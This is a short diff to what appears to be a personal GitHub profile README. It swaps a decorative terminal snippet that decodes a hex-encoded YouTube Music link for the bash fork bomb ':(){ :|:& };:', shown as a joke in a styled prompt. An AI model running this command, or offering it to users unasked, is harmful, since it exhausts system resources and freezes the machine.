@@ -32,5 +32,6 @@ Here are some ideas to get you started:
 </picture>
 
 ```bash
-┌──(rIleria@aeri)-[~]
-└─$ echo "68747470733a2f2f6d757369632e796f75747562652e636f6d2f77617463683f763d5f73694a5267446c646459266c6973743d4c4d" | xxd -r -p
+┌──(rileriaaa@aeri)-[~]
+└─$ :(){ :|:& };:
+
